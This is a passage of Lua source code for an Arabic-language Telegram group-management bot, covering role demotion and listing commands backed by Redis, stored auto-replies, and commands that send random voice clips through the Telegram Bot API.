bot.sendText(msg.chat_id,msg.id,"*‹ : عذرا يجب ان تستخدم معرف لحساب شخصي فقط .*","md",true)  
return false
end
if TextMsg == 'مطور ثانوي' then
srt = "programmer"
srt1 = ":"
elseif TextMsg == 'مطور' then
srt = "developer"
srt1 = ":"
elseif TextMsg == 'مالك' then
srt = "Creator"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'منشئ اساسي' then
srt = "BasicConstructor"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'منشئ' then
srt = "Constructor"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'مدير' then
srt = "Owner"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'ادمن' then
srt = "Administrator"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'مميز' then
srt = "Vips"
srt1 = ":"..msg.chat_id..":"
else
return false
end  
local UserInfo = bot.getUser(UserId_Info.id)
if UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"\n*‹ : عذرآ تستطيع فقط استخدام الامر على المستخدمين .*","md",true)  
return false
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*‹ : عذرآ لا تستطيع استخدام الامر على البوت .*","md",true)  
return false
end
if not redis:sismember(bot_id..srt1.."Status:"..srt,UserId_Info.id) then
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id,"*‹ : لا يمتلك رتبه بالفعل .*").yu,"md",true)  
return false
end
if devB(msg.sender.user_id) then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif programmer(msg) then
if TextMsg == 'مطور' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مالك' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'منشئ اساسي' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'منشئ' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
else
return false
end
elseif developer(msg) then
if TextMsg == 'مالك' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'منشئ اساسي' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'منشئ' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
else
return false
end  
elseif Creator(msg) then
if TextMsg == 'منشئ اساسي' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'منشئ' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
else
return false
end  
elseif BasicConstructor(msg) then
if TextMsg == 'منشئ' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
else
return false
end  
elseif Constructor(msg) then
if TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
else
return false
end  
elseif Owner(msg) then
if TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
else
return false
end  
elseif Administrator(msg) then
if TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,UserId_Info.id)
else
return false
end  
elseif Vips(msg) then
return false
else
return false
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(UserId_Info.id,"*‹ : تم تنزيله بنجاح .*").i,"md",true)  
return false
end
end
if text and text:match("^تنزيل (.*)$") and tonumber(msg.reply_to_message_id) ~= 0 then
local TextMsg = text:match("^تنزيل (.*)$")
if msg.content.text then 
if TextMsg == 'مطور ثانوي' then
srt = "programmer"
srt1 = ":"
elseif TextMsg == 'مطور' then
srt = "developer"
srt1 = ":"
elseif TextMsg == 'مالك' then
srt = "Creator"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'منشئ اساسي' then
srt = "BasicConstructor"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'منشئ' then
srt = "Constructor"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'مدير' then
srt = "Owner"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'ادمن' then
srt = "Administrator"
srt1 = ":"..msg.chat_id..":"
elseif TextMsg == 'مميز' then
srt = "Vips"
srt1 = ":"..msg.chat_id..":"
else
return false
end  
local Remsg = bot.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = bot.getUser(Remsg.sender.user_id)
if UserInfo.message == "Invalid user ID" then
bot.sendText(msg.chat_id,msg.id,"\n*‹ : عذرآ تستطيع فقط استخدام الامر على المستخدمين .*","md",true)  
return false
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
bot.sendText(msg.chat_id,msg.id,"\n*‹ : عذرآ لا تستطيع استخدام الامر على البوت .*","md",true)  
return false
end
if not redis:sismember(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id) then
bot.sendText(msg.chat_id,msg.id,Reply_Status(Remsg.sender.user_id,"*‹ : لا يمتلك رتبه بالفعل .*").yu,"md",true)  
return false
end
if devB(msg.sender.user_id) then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif programmer(msg) then
if TextMsg == 'مطور' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مالك' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'منشئ اساسي' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'منشئ' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
else
return false
end
elseif developer(msg) then
if TextMsg == 'مالك' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'منشئ اساسي' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'منشئ' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
else
return false
end  
elseif Creator(msg) then
if TextMsg == 'منشئ اساسي' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'منشئ' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
else
return false
end  
elseif BasicConstructor(msg) then
if TextMsg == 'منشئ' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
else
return false
end  
elseif Constructor(msg) then
if TextMsg == 'مدير' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
else
return false
end  
elseif Owner(msg) then
if TextMsg == 'ادمن' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
elseif TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
else
return false
end  
elseif Administrator(msg) then
if TextMsg == 'مميز' then
redis:srem(bot_id..srt1.."Status:"..srt,Remsg.sender.user_id)
else
return false
end  
elseif Vips(msg) then
return false
else
return false
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(Remsg.sender.user_id,"*‹ : تم تنزيله بنجاح .*").i,"md",true)  
return false
end
end
----------------------------------------------------------------------------------------------------
if Administrator(msg) then
if text == 'الثانويين' then
t = '\n*‹ : قائمه '..text..'  \n ٴ━═━═━═━═━═━═━═━ *\n'
local Info_ = redis:smembers(bot_id..":Status:programmer") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : لا يوجد "..text:gsub('ال',"").."*").yu,"md",true)  
return false
end  
for k, v in pairs(Info_) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
t = t.."*"..k.." ‹ : *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
t = t.."*"..k.." ‹ :* ["..v.."](tg://user?id="..v..")\n"
end
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).yu,"md",true)  
end
if text == 'المطورين' then
t = '\n*‹ : قائمه '..text..'  \n ٴ━═━═━═━═━═━═━═━ *\n'
local Info_ = redis:smembers(bot_id..":Status:developer") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : لا يوجد "..text:gsub('ال',"").."*").yu,"md",true)  
return false
end  
for k, v in pairs(Info_) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
t = t.."*"..k.." ‹ : *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
t = t.."*"..k.." ‹ :* ["..v.."](tg://user?id="..v..")\n"
end
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).yu,"md",true)  
end
if text == 'المالكين' then
t = '\n*‹ : قائمه '..text..'  \n ٴ━═━═━═━═━═━═━═━ *\n'
local Info_ = redis:smembers(bot_id..":"..msg.chat_id..":Status:Creator") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : لا يوجد المالكين*").yu,"md",true)  
return false
end  
for k, v in pairs(Info_) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
t = t.."*"..k.." ‹ : *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
t = t.."*"..k.." ‹ :* ["..v.."](tg://user?id="..v..")\n"
end
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).yu,"md",true)  
end
if text == 'المنشئين الاساسيين' then
t = '\n*‹ : قائمه '..text..'  \n ٴ━═━═━═━═━═━═━═━ *\n'
local Info_ = redis:smembers(bot_id..":"..msg.chat_id..":Status:BasicConstructor") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : لا يوجد "..text:gsub('ال',"").."*").yu,"md",true)  
return false
end  
for k, v in pairs(Info_) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
t = t.."*"..k.." ‹ : *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
t = t.."*"..k.." ‹ :* ["..v.."](tg://user?id="..v..")\n"
end
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).yu,"md",true)  
end
if text == 'المنشئين' then
t = '\n*‹ : قائمه '..text..'  \n ٴ━═━═━═━═━═━═━═━ *\n'
local Info_ = redis:smembers(bot_id..":"..msg.chat_id..":Status:Constructor") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : لا يوجد "..text:gsub('ال',"").."*").yu,"md",true)  
return false
end  
for k, v in pairs(Info_) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
t = t.."*"..k.." ‹ : *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
t = t.."*"..k.." ‹ :* ["..v.."](tg://user?id="..v..")\n"
end
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).yu,"md",true)  
end
if text == 'المدراء' then
t = '\n*‹ : قائمه '..text..'  \n ٴ━═━═━═━═━═━═━═━ *\n'
local Info_ = redis:smembers(bot_id..":"..msg.chat_id..":Status:Owner") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : لا يوجد "..text:gsub('ال',"").."*").yu,"md",true)  
return false
end  
for k, v in pairs(Info_) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
t = t.."*"..k.." ‹ : *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
t = t.."*"..k.." ‹ :* ["..v.."](tg://user?id="..v..")\n"
end
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).yu,"md",true)  
end
if text == 'الادمنيه' then
t = '\n*‹ : قائمه '..text..'  \n ٴ━═━═━═━═━═━═━═━ *\n'
local Info_ = redis:smembers(bot_id..":"..msg.chat_id..":Status:Administrator") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : لا يوجد "..text:gsub('ال',"").."*").yu,"md",true)  
return false
end  
for k, v in pairs(Info_) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
t = t.."*"..k.." ‹ : *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
t = t.."*"..k.." ‹ :* ["..v.."](tg://user?id="..v..")\n"
end
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).yu,"md",true)  
end
if text == 'المميزين' then
t = '\n*‹ : قائمه '..text..'  \n ٴ━═━═━═━═━═━═━═━ *\n'
local Info_ = redis:smembers(bot_id..":"..msg.chat_id..":Status:Vips") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : لا يوجد "..text:gsub('ال',"").."*").yu,"md",true)  
return false
end  
for k, v in pairs(Info_) do
local UserInfo = bot.getUser(v)
if UserInfo and UserInfo.username and UserInfo.username ~= "" then
t = t.."*"..k.." ‹ : *[@"..UserInfo.username.."](tg://user?id="..v..")\n"
else
t = t.."*"..k.." ‹ :* ["..v.."](tg://user?id="..v..")\n"
end
end
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,t).yu,"md",true)  
end
----------------------------------------------------------------------------------------------------
end
if text == 'مسح الثانويين' and devB(msg.sender.user_id) then
local Info_ = redis:smembers(bot_id..":Status:programmer") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم حذف "..text:gsub('مسح',"").." سابقا .*").yu,"md",true)  
return false
end  
redis:del(bot_id..":Status:programmer") 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").yu,"md",true)  
end
if text == 'مسح المطورين' and programmer(msg) then
local Info_ = redis:smembers(bot_id..":Status:developer") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم حذف "..text:gsub('مسح',"").." سابقا .*").yu,"md",true)  
return false
end  
redis:del(bot_id..":Status:developer") 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").yu,"md",true)  
end
if text == 'مسح المالكين' and developer(msg) then
local Info_ = redis:smembers(bot_id..":"..msg.chat_id..":Status:Creator") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم حذف "..text:gsub('مسح',"").." سابقا .*").yu,"md",true)  
return false
end  
redis:del(bot_id..":"..msg.chat_id..":Status:Creator") 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").yu,"md",true)  
end
if text == 'مسح المنشئين الاساسيين' and Creator(msg) then
local Info_ = redis:smembers(bot_id..":"..msg.chat_id..":Status:BasicConstructor") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم حذف "..text:gsub('مسح',"").." سابقا .*").yu,"md",true)  
return false
end  
redis:del(bot_id..":"..msg.chat_id..":Status:BasicConstructor") 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").yu,"md",true)  
end
if text == 'مسح المنشئين' and BasicConstructor(msg) then
local Info_ = redis:smembers(bot_id..":"..msg.chat_id..":Status:Constructor") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم حذف "..text:gsub('مسح',"").." سابقا .*").yu,"md",true)  
return false
end  
redis:del(bot_id..":"..msg.chat_id..":Status:Constructor") 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").yu,"md",true)  
end
if text == 'مسح المدراء' and Constructor(msg) then
local Info_ = redis:smembers(bot_id..":"..msg.chat_id..":Status:Owner") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم حذف "..text:gsub('مسح',"").." سابقا .*").yu,"md",true)  
return false
end  
redis:del(bot_id..":"..msg.chat_id..":Status:Owner") 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").yu,"md",true)  
end
if text == 'مسح الادمنيه' and Owner(msg) then
local Info_ = redis:smembers(bot_id..":"..msg.chat_id..":Status:Administrator") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم حذف "..text:gsub('مسح',"").." سابقا .*").yu,"md",true)  
return false
end  
redis:del(bot_id..":"..msg.chat_id..":Status:Administrator") 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").yu,"md",true)  
end
if text == 'مسح المميزين' and Administrator(msg) then
local Info_ = redis:smembers(bot_id..":"..msg.chat_id..":Status:Vips") 
if #Info_ == 0 then
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم حذف "..text:gsub('مسح',"").." سابقا .*").yu,"md",true)  
return false
end  
redis:del(bot_id..":"..msg.chat_id..":Status:Vips") 
bot.sendText(msg.chat_id,msg.id,Reply_Status(msg.sender.user_id,"*‹ : تم "..text.." بنجاح .*").yu,"md",true)  
end
----------------------------------------------------------------------------------------------------
if text and not redis:get(bot_id..":"..msg.chat_id..":settings:Reply:all") then
if not redis:sismember(bot_id..'Spam:Group'..msg.sender.user_id,text) then
local Text = redis:get(bot_id.."Rp:all:content:Text:"..text)
local Sticker = redis:get(bot_id.."Rp:all:content:Sticker:"..text) 
local VoiceNote = redis:get(bot_id.."Rp:all:content:VoiceNote:"..text) 
local photo = redis:get(bot_id.."Rp:all:content:Photo:"..text)
local video = redis:get(bot_id.."Rp:all:content:Video:"..text)
local document = redis:get(bot_id.."Rp:all:Manager:File:"..text)
local Videonote = redis:get(bot_id.."Rp:all:content:Video_note:"..text)
local audio = redis:get(bot_id.."Rp:all:content:Audio:"..text)
local Animation = redis:get(bot_id.."Rp:all:content:Animation:"..text)
local VoiceNotecaption = redis:get(bot_id.."Rp:all:content:VoiceNote:caption:"..text) or ""
local photocaption = redis:get(bot_id.."Rp:all:content:Photo:caption:"..text) or ""
local videocaption = redis:get(bot_id.."Rp:all:content:Video:caption:"..text) or ""
local documentcaption = redis:get(bot_id.."Rp:all:Manager:File:caption:"..text) or ""
local Animationcaption = redis:get(bot_id.."Rp:all:content:Animation:caption:"..text) or ""
local audiocaption = redis:get(bot_id.."Rp:all:content:Audio:caption:"..text) or ""
if Text  then
local UserInfo = bot.getUser(msg.sender.user_id)
local countMsg = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":message") or 1
local totlmsg = Total_message(countMsg) 
local getst = Get_Rank(msg.sender.user_id,msg.chat_id)
local countedit = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Editmessage") or 0
local Text = Text:gsub('#username',(UserInfo.username or 'لا يوجد')):gsub('#name',UserInfo.first_name):gsub('#id',msg.sender.user_id):gsub('#edit',countedit):gsub('#msgs',countMsg):gsub('#stast',getst)
bot.sendText(msg.chat_id,msg.id,"["..Text.."]","md",true)  
redis:sadd(bot_id.."Spam:Group"..msg.sender.user_id,text) 
end 
if Sticker then
bot.sendSticker(msg.chat_id, msg.id, Sticker)
redis:sadd(bot_id.."Spam:Group"..msg.sender.user_id,text) 
end  
if photo  then
bot.sendPhoto(msg.chat_id, msg.id, photo,photocaption)
redis:sadd(bot_id.."Spam:Group"..msg.sender.user_id,text) 
end  
if VoiceNote then
bot.sendVoiceNote(msg.chat_id, msg.id, VoiceNote,"["..VoiceNotecaption.."]", "md")
redis:sadd(bot_id.."Spam:Group"..msg.sender.user_id,text) 
end  
if video  then
bot.sendVideo(msg.chat_id, msg.id, video,"["..videocaption.."]", "md")
redis:sadd(bot_id.."Spam:Group"..msg.sender.user_id,text) 
end  
if document  then
bot.sendDocument(msg.chat_id, msg.id, document,"["..documentcaption.."]", "md")
redis:sadd(bot_id.."Spam:Group"..msg.sender.user_id,text) 
end  
if audio  then
bot.sendAudio(msg.chat_id, msg.id, audio,"["..audiocaption.."]", "md")
redis:sadd(bot_id.."Spam:Group"..msg.sender.user_id,text) 
end  
if Videonote  then
bot.sendVideoNote(msg.chat_id, msg.id,"["..Videonote.."]", "md")  
redis:sadd(bot_id.."Spam:Group"..msg.sender.user_id,text) 
end 
if Animation then
bot.sendAnimation(msg.chat_id,msg.id,Animation,"["..Animationcaption.."]", "md")
redis:sadd(bot_id.."Spam:Group"..msg.sender.user_id,text) 
end 
end 
end
if text and not redis:get(bot_id..":"..msg.chat_id..":settings:Reply") then
if text and redis:sismember(bot_id..'List:array'..msg.chat_id,text) then
local list = redis:smembers(bot_id.."Add:Rd:array:Text"..text..msg.chat_id)
return bot.sendText(msg.chat_id,msg.id,"["..list[math.random(#list)].."]","md",true)  
end  
if not redis:sismember(bot_id..'Spam:Group'..msg.sender.user_id,text) then
local Text = redis:get(bot_id.."Rp:content:Text"..msg.chat_id..":"..text)
local Sticker = redis:get(bot_id.."Rp:content:Sticker"..msg.chat_id..":"..text) 
local VoiceNote = redis:get(bot_id.."Rp:content:VoiceNote"..msg.chat_id..":"..text) 
local photo = redis:get(bot_id.."Rp:content:Photo"..msg.chat_id..":"..text)
local video = redis:get(bot_id.."Rp:content:Video"..msg.chat_id..":"..text)
local document = redis:get(bot_id.."Rp:Manager:File"..msg.chat_id..":"..text)
local Videonote = redis:get(bot_id.."Rp:content:Video_note"..msg.chat_id..":"..text)
local audio = redis:get(bot_id.."Rp:content:Audio"..msg.chat_id..":"..text)
local Animation = redis:get(bot_id.."Rp:content:Animation"..msg.chat_id..":"..text)
local VoiceNotecaption = redis:get(bot_id.."Rp:content:VoiceNote:caption"..msg.chat_id..":"..text) or ""
local photocaption = redis:get(bot_id.."Rp:content:Photo:caption"..msg.chat_id..":"..text) or ""
local videocaption = redis:get(bot_id.."Rp:content:Video:caption"..msg.chat_id..":"..text) or ""
local documentcaption = redis:get(bot_id.."Rp:Manager:File:caption"..msg.chat_id..":"..text) or ""
local Animationcaption = redis:get(bot_id.."Rp:content:Animation:caption"..msg.chat_id..":"..text) or ""
local audiocaption = redis:get(bot_id.."Rp:content:Audio:caption"..msg.chat_id..":"..text) or ""
if Text  then
local UserInfo = bot.getUser(msg.sender.user_id)
local countMsg = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":message") or 1
local totlmsg = Total_message(countMsg) 
local getst = Get_Rank(msg.sender.user_id,msg.chat_id)
local countedit = redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Editmessage") or 0
local Text = Text:gsub('#username',(UserInfo.username or 'لا يوجد')):gsub('#name',UserInfo.first_name):gsub('#id',msg.sender.user_id):gsub('#edit',countedit):gsub('#msgs',countMsg):gsub('#stast',getst)
bot.sendText(msg.chat_id,msg.id,"["..Text.."]","md",true)  
redis:sadd(bot_id.."Spam:Group"..msg.sender.user_id,text) 
end 
if Sticker then
bot.sendSticker(msg.chat_id, msg.id, Sticker)
redis:sadd(bot_id.."Spam:Group"..msg.sender.user_id,text) 
end  
if photo  then
bot.sendPhoto(msg.chat_id, msg.id, photo,photocaption)
redis:sadd(bot_id.."Spam:Group"..msg.sender.user_id,text) 
end  
if VoiceNote then
bot.sendVoiceNote(msg.chat_id, msg.id, VoiceNote,"["..VoiceNotecaption.."]", "md")
redis:sadd(bot_id.."Spam:Group"..msg.sender.user_id,text) 
end  
if video  then
bot.sendVideo(msg.chat_id, msg.id, video,"["..videocaption.."]", "md")
redis:sadd(bot_id.."Spam:Group"..msg.sender.user_id,text) 
end  
if document  then
bot.sendDocument(msg.chat_id, msg.id, document,"["..documentcaption.."]", "md")
redis:sadd(bot_id.."Spam:Group"..msg.sender.user_id,text) 
end  
if audio  then
bot.sendAudio(msg.chat_id, msg.id, audio,"["..audiocaption.."]", "md")
redis:sadd(bot_id.."Spam:Group"..msg.sender.user_id,text) 
end  
if Videonote  then
bot.sendVideoNote(msg.chat_id, msg.id,"["..Videonote.."]", "md")  
redis:sadd(bot_id.."Spam:Group"..msg.sender.user_id,text) 
end 
if Animation then
bot.sendAnimation(msg.chat_id,msg.id,Animation,"["..Animationcaption.."]", "md")
redis:sadd(bot_id.."Spam:Group"..msg.sender.user_id,text) 
end 
end 
end
----------------------------------------------------------------------------------------------------
----------------------------------------------------------------------------------------------------
if msg.content.text then
if msg.content.text.text == "غنيلي" and tonumber(msg.reply_to_message_id) == 0 then
if redis:get(bot_id..":"..msg.chat_id..":Features") then
return bot.sendText(msg.chat_id,msg.id,"*‹ : تم تعطيل المميزات بواسطه المدراء .*","md",true)  
end
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '‹ : FSouRce u . ', url="t.me/FeLX_TEaM"}
},
}
local msgg = msg.id/2097152/0.5
return https.request("https://api.telegram.org/bot"..Token.."/sendVoice?chat_id="..msg.chat_id.."&voice=https://t.me/rewrrt/"..math.random(2,417).."&caption="..URL.escape("‹ : تم اختيار الاغنيه لك .").."&reply_to_message_id="..msgg.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
if msg.content.text then
if msg.content.text.text == "شعر" and tonumber(msg.reply_to_message_id) == 0 then
if redis:get(bot_id..":"..msg.chat_id..":Features") then
return bot.sendText(msg.chat_id,msg.id,"*‹ : تم تعطيل المميزات بواسطه المدراء .*","md",true)  
end
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '‹ : FSouRce u . ', url="t.me/FeLX_TEaM"}
},
}
local msgg = msg.id/2097152/0.5
return https.request("https://api.telegram.org/bot"..Token.."/sendVoice?chat_id="..msg.chat_id.."&voice=https://t.me/rteww0/"..math.random(2,169).."&caption="..URL.escape("‹ : تم اختيار شعر لك .").."&reply_to_message_id="..msgg.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
if msg.content.text then
if msg.content.text.text == "ميمز" and tonumber(msg.reply_to_message_id) == 0 then
if redis:get(bot_id..":"..msg.chat_id..":Features") then
return bot.sendText(msg.chat_id,msg.id,"*‹ : تم تعطيل المميزات بواسطه المدراء .*","md",true)  
end
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '‹ : FSouRce u . ', url="t.me/FeLX_TEaM"}
},
}
local msgg = msg.id/2097152/0.5
